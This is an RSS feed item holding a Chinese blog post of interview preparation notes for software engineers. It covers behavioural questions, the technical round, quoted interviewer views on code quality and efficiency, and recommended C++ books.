&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;strong&gt;3.现场面试&lt;/strong&gt; （准备：规划好路线并估算出行时间，准备好得体的衣服，注意面试邀请函里面的面试流程，准备几个问题。面试：面试官通过应聘者的语言和行动，考察他的沟通能力、学习能力、编程能力等综合实力。）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;面试的是三个环节&quot;&gt;面试的是三个环节：&lt;/h3&gt;
&lt;h4 id=&quot;行为面试510min过一遍简历内容&quot;&gt;1.行为面试（5～10min，过一遍简历内容）&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;1.1 自我介绍30s-1m&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;主要学习、工作经历以及意向，面试官若对某些细节感兴趣会提问&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1.2 项目经历（注意“参与”vs “负责”）&lt;/strong&gt;：STAR模型描述&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.3 应聘者掌握的技能（注意“了解” vs “熟悉” vs “精通”）：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;了解：对某一个技术知识上过课或看过书，但没有做过实际的项目。（通常不建议在简历中列出只是肤浅地了解一点的技能，除非这项技术应聘的职位的确需要。）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;熟悉：（大多情况下使用）在实践项目中适用某一项技术已经有较长的时间，通过查阅相关的文档可以独立解决大部分问题，我们就熟悉它了。对于应届毕业生而言，毕业设计所用到的技能；对于已工作过的，在项目开发过程中所用到的技能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;精通：对一项技术得心应手，在项目开发过程中当同学或同事向我们请教这个领域的问题我们都有信心也有能力解决。（应聘者不要试图在简历中把自己修饰成“高人”而轻易适用“精通”，除非自己能够很轻松地回答这个领域里的绝大多数问题，否则就会适得其反。）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1.4 回答为什么跳槽：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;了解应聘者的性格，可以大胆的回答自己真实的想法，但也不能想说什么就说什么，以免给面试官留下负面的印象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;避免一下几个原因：老板太苛刻，同事太难相处，加班太频繁，工资太低。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;笔者在面试的时候，通常给出的答案是：现在的工作做了一段时间了，已经没有太多的激情了，因此希望寻找一份更有挑战的工作。然后具体论述为什么有些厌倦现在的职位，以及面试的职位我为什么会有兴趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;第一次跳槽（从Autodesk -&amp;gt; 微软）：我在Autodesk 开发的软件Civil 3D 是一款面向土木行业的设计软件。如果我想在现在的职位上得到提升，就必须加强土木行业的学习，可我对诸如计算土方量、道路设计等没有太多兴趣，因此出来寻找机会。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;第二次跳槽（从微软-&amp;gt;思科）：我在微软的主要工作是开发和维护.NET的UI平台Windows。由于Windows已经非常成熟，不需要添加多少新功能，因此我的大部分工作都是维护和修改BUG。两年下来，调试的能力得到了很大的提高，但长期如此自己的软件开发和设计能力将不能得到提高，因此想出来寻找可以设计和开发系统的职位。同时，我在过去几年里的工作都是开发桌面软件，对网络了解甚少，因此希望下一个工作能与网络相关（思科是网络公司）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;技术面试-4050min&quot;&gt;2.技术面试 （40～50min）&lt;/h4&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;5种素质：扎实的基础知识（编程语言、数据结构、算法等）、能写高质量的代码（正确的、完整的、鲁棒的）、分析问题时思路清晰（思路清晰分析和解决复杂问题）、能优化时间效率和空间效率（从时间和空间角度优化算法）、学习沟通等各方面的能力（沟通能力、学习能力和发散思维能力）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;应聘者提问510min&quot;&gt;3.应聘者提问（5～10min）&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;为每一轮面试准备2～3个问题。至少要问一两个问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;不要问的问题：（1）不要问和自己的职位没有关系的问题，比如问“公司未来五年的发展战略是什么？”（2）不要问薪水，等过了技术面到HR面再说。（3）不要立即打听面试结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;推荐问的问题：与招聘职位或者项目相关的问题，如果这类问题问得很到位，那么面试官就会觉得你对应聘的职位很感兴趣。从两个方面收集信息：（1）面试前要做足功课，到网上收集一些相关信息，做到对公司成立时间、主要业务、职位要求了然于胸；（2）面试过程中留心面试官说过的话。&lt;br/&gt;比如：如何对新员工进行培训？需要掌握什么样的知识？&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面试官谈基础知识&quot;&gt;面试官谈基础知识&lt;/h2&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;c++的基础知识，如面向对象的特性、构造函数、析构函数、动态绑定等，能够反映出应聘者是否善于把握问题本质，有没有耐心深入一个问题。另外还有常用的设计模式、UML图等，这些都能体现应聘者是否有软件工程方面的经验。—— 王海波（Autodesk，软件工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;对基础知识的考察我特别重视c++中对内存的适用管理。我觉得内存管理是c++程序员特别要注意的，因为内存的适用和管理会影响程序的效率和稳定性。—— 蓝诚 （Autodesk, 软件工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;基础知识反映了一个人的基本能力和基础素质、是以后工作中最核心的能力要求。我一般考察：（1）数据结构和算法；（2）编程能力；（3）部分数学知识，如概率；（4）问题的分析和推理能力。 —— 张晓禹（百度，技术经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;我比较重视四块基础知识：（1）编程基本功（特别喜欢字符串处理这一类的问题）；（2）并发控制；（3）算法、复杂度；（4）语言的基本概念。 —— 张珺（百度，高级软件工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;我会考察编程基础、计算机系统基础知识、算法以及设计能力。这些是一个软件工程师的最基本的东西，这些方面表现出色的人，我们一般认为是有发展潜力的。—— 韩伟东（盛大，高级研究员）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;（1）对os的理解程度。这些知识对于工作中常遇到的内存管理、文件操作、程序性能、多线程、程序安全等有重要帮助。对于os理解比较深入的人对于偏底层的工作上手一般比快。（2）对于一门编程语言的掌握程度。一个热爱编程的人应该对某种语言有比较深入的了解。通常这样的人对于新的编程语言上手也比较快，而且理解比较深入。（3）常用的算法和数据结构。不了解这些的程序员基本只能写写“hello world”。 —— 陈黎明（微软， SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;推荐的c书籍&quot;&gt;推荐的c++书籍：&lt;/h2&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;《Effective C++》, 《C++ Primer》, 《Inside C++ Object Model》, 《The C++ Programming Language》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;基础知识&quot;&gt;基础知识：&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;编程语言 + 数据结构 + 算法和数据操作&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面试官谈代码质量&quot;&gt;面试官谈代码质量&lt;/h2&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;一般会考察代码的容错处理能力，针对一些特别的输入会询问应聘人员是否考虑，如何处理。不能容忍代码只是针对一种遐想的‘正常值’进行处理，不考虑异常状况，也不考虑资源的回收等问题。 —— 殷焰（支付宝，高级安全测试工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;如果是因为粗心犯错，可以原谅，因为毕竟面试的时候会紧张；不能容忍的是，该掌握的知识点却没有掌握，而且提醒了还不知道。比如下面的：double d1, d2; .... if(d1 == d2) ... —— 马凌洲（Autodesk, Software Development Manager）&lt;br/&gt;（解释：犹豫精度原因不能用等号判断两个小数是否相等）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;最不能容忍功能错误，忽略边界情况。 —— 尹彦 （Intel, Software Engineer）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;如果一个程序员连变量、函数命名都毫无章法，解决一个具体问题都找不到一个最合适的数据结果，这会让面试官印象大打折扣，因为这个只能说明他程序写得太少，不够熟悉。—— 吴斌 （NVidia, Graphics Architect）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;我会从程序的正确性和鲁棒性两方面检查代码的质量。会关注对输入参数的检查、处理错误和异常的方式、命名方式等。对于没有工作经验的学生，程序正确性之外的错误基本都能容忍，但经过提示后希望能够很快解决。对于有工作经验的人，不能容忍考虑不周到、有明显的鲁棒性错误。 —— 田超 （微软，SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;代码质量&quot;&gt;代码质量&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;代码的规范性： 清晰的书写、清晰的布局、合理的命名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;代码的完整性： 3个方面保证代码完整性：功能测试、边界测试、负面测试 （溢出、递归正确退出、不合法的输入）。3种错误处理方法：返回值、全局变量、异常&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;返回值&lt;/td&gt;
&lt;td&gt;和系统api一致&lt;/td&gt;
&lt;td&gt;不能方便地适用计算结果&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;全局变量&lt;/td&gt;
&lt;td&gt;能够方便地适用计算结果&lt;/td&gt;
&lt;td&gt;用户可能忘记检查全局变量&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;异常&lt;/td&gt;
&lt;td&gt;可以为不同出错原因定义不同异常类型，逻辑清晰明了&lt;/td&gt;
&lt;td&gt;有些语言不支持异常，抛出异常时对性能有负面影响。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;代码的鲁棒性：采取防御式编程、处理无效的输入&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面试官谈面试思路&quot;&gt;面试官谈面试思路&lt;/h2&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;编码前讲自己的思路是一个考查指标。一个合格的应聘者应该在他做事之前明白自己要做的事情究竟是什么，以及该怎么做。一开始就编码的人员，除非后面表现非常优秀，否则很容易通不过。 —— 殷焰（支付宝，高级安全测试工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;让应聘者给我讲具体的问题分析过程，经常会要求他证明。 —— 张晓禹（百度，技术经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;个人比较倾向于让应聘者在写代码之前解释他的思路。应聘者如果没有想清楚就动手本身就不是太好。应聘者可以采用举例子、画图等多种方式，解释清楚问题本身和问题解决方案是关键。 —— 何幸杰（SAP，高级工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;对于比较复杂的算法和设计，一般来讲最好是在开始写代码前讲清楚思路和设计。 —— 尧敏（淘宝，资深经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;喜欢应聘者先讲清思路。如果觉察到方案的错误和漏洞，我会让他证明是否正确，主要是希望他能在分析的过程中发现这些错误和漏洞并加以改正。 —— 陈黎明（微软，SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;喜欢应聘者在写代码之前先讲思路，举例子和画图都是很好的方法。 —— 田超（微软， SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;复杂问题解决思路&quot;&gt;复杂问题解决思路&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;画图 、举例子 、 分解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面试官谈效率&quot;&gt;面试官谈效率&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;通常针对一些senior的candidates会问一些关于时间、空间效率的问题，这能够体现一个应聘者较好的编程素养和能力。 —— 刘景勇（Autodesk, 软件工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;面试时一般会直接要求空间和时间复杂度，这两者都很重要。 —— 张珺（百度，高级软件工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;我们有很多考查时间、空间效率方面的问题。通常两者都给应聘者限定，然后让他给出解决方案。 —— 张晓禹（百度，技术经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;只要不是特别大的内存开销，时间复杂度比较重要。因为改进时间复杂度对算法的要求更高。 —— 吴斌（NVidia, Graphics Architect）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;空间换时间还是时间换空间，这要看具体的题目了。对于普通的应用，一般是空间换时间，因为通常用户更关心速度，而且一般有足够的存储空间允许这么做。但对于现在的一般嵌入式设备，很多时候空间换时间就不现实了，因为存储空间太少了。 —— 陈黎明 （微软， SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一些小提示&quot;&gt;一些小提示&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;c／c++程序员养成采用引用（或指针）传递复杂类型参数的习惯。如果采用值传递的方式，从形参到实参会产生一次复制操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;循环和递归。循环一般效率较高，递归一般较为简洁。递归需要适用函数栈，严格来说分析的时候要考虑。&lt;br/&gt;展现敏捷的思维能力和追求完美的激情。（先给出直观的办法，然后继续优化）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面试官谈能力&quot;&gt;面试官谈能力&lt;/h2&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;应聘者能够礼貌平和、不卑不亢地和面试官交流，逻辑清晰、详略得当地介绍自己及项目经历，谈论题目时能够发现问题的细节并向面试官进行询问，这些都是比较好的沟通表现。对自己做的项目能够了解很深入、对面试题能够快速寻找解决方法是判断应聘者学习能力的一个方法。这两个能力都很重要，基本能够起到一票否决的作用。 —— 殷焰（支付宝，高级安全测试工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;有时候会问一些应聘者不是很熟悉的领域，看应聘者在遇到难题时的反映，在他们回答不出时会有人员提供解答，在解答过程中观察他们的沟通能力及求知欲。 —— 朱麟（交通银行，项目经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;沟通能力其实整个过程都在考核，包括询问他过往的经历，也通常会涉及沟通能力。学习能力是在考查算法或者项目经验过程中，通过提问，尤其是一些他没有接触过的问题来考核的。沟通能力和学习能力很重要，在某种程度上这些都是潜力。如果应聘者沟通能力不行、难以合作，我们不会录取。 —— 何幸杰（SAP，高级工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;让其介绍过往项目其实就是在考查沟通和表达能力。学习能力通过问其看书和关注什么来考查。沟通能力、学习能力对最终面试结果会有一定的影响。对于资深的应聘者，影响要大些。—— 韩伟东（盛大，高级研究员）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;应聘者会被问及一些需求不是很明确的问题，解决这些问题需要应聘者和面试官进行沟通，以及在讲解设计思路和代码的过程中也需要和面试官交流互动。沟通及学习能力是面试成绩中关键的考查点。 —— 尧敏（淘宝，资深经理）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;沟通、学习能力就是看面试者能否清晰、有条理地表达自己，是否会在自己所得到的信息不够的情况下主动发问澄清，能否在得到一些暗示之后迅速做出反映纠正错误。 —— 陈黎明（微软，SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;综合能力&quot;&gt;综合能力&lt;/h2&gt;
&lt;p&gt;编程能力、沟通能力、学习能力、知识迁移能力、抽象建模能力、发散思维能力....&lt;/p&gt;

&lt;p&gt;面试思路：&lt;/p&gt;
&lt;p&gt;链表：&lt;/p&gt;
&lt;p&gt;递归和循环：&lt;/p&gt;
&lt;p&gt;综合：&lt;/p&gt;
&lt;p&gt;知识迁移能力：&lt;/p&gt;
&lt;p&gt;树：&lt;/p&gt;
&lt;p&gt;栈和队列：&lt;/p&gt;
&lt;p&gt;查找和排序：&lt;/p&gt;
&lt;p&gt;时间空间效率的平衡：&lt;/p&gt;
&lt;p&gt;时间效率：&lt;/p&gt;
&lt;p&gt;数组：&lt;/p&gt;
&lt;p&gt;抽象建模能力：&lt;/p&gt;
&lt;p&gt;字符串：&lt;/p&gt;
&lt;p&gt;回溯法：&lt;/p&gt;
&lt;p&gt;发散思维能力：&lt;/p&gt;
&lt;p&gt;分解让复杂问题简单：&lt;/p&gt;
&lt;p&gt;位运算：&lt;/p&gt;
&lt;p&gt;代码的鲁棒性：&lt;/p&gt;
&lt;p&gt;代码的完整性：&lt;/p&gt;
&lt;p&gt;举例让抽象具体化：&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 09:32:00 +0000</pubDate>
<dc:creator>.....?</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fanling999/p/7810558.html</dc:identifier>
</item>
</channel>
</rss>